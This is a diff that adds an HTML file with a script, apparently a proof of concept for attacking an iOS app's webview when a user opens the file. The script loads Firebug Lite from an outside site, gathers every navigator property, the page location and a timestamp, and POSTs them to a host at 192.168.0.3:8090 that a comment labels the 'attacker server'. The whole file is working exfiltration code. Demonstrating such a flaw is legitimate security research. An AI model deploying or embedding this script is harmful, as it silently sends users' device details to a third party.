@@ -1,0 +1,21 @@
+<!-- script that load a firebug lite version to get the webview debuggin console inside the app -->
+<script src='https://getfirebug.com/firebug-lite-debug.js'></script>
+<script>
+// iterating the navigator object that contain interesting info from the user device, iOS version, iOS device, language
+var nav = {};
+for (var property in navigator) {
+nav[property] = navigator[property];
+}
+// tracking when the user open the file with the date
+var d = new Date();
+var nav_formated = '<pre><h1>'+ document.location + '</h1><h2>' + d + ','+ JSON.stringify(nav, null, 2) + '</h2><pre>';
+// writting the results 
+document.write(nav_formated);
+// send data to the 'attacker server'
+send_response(nav_formated);
+function send_response(response){
+var o_req = new XMLHttpRequest();
+o_req.open('POST','http://192.168.0.3:8090/');
+o_req.send(response);
+}
+</script>
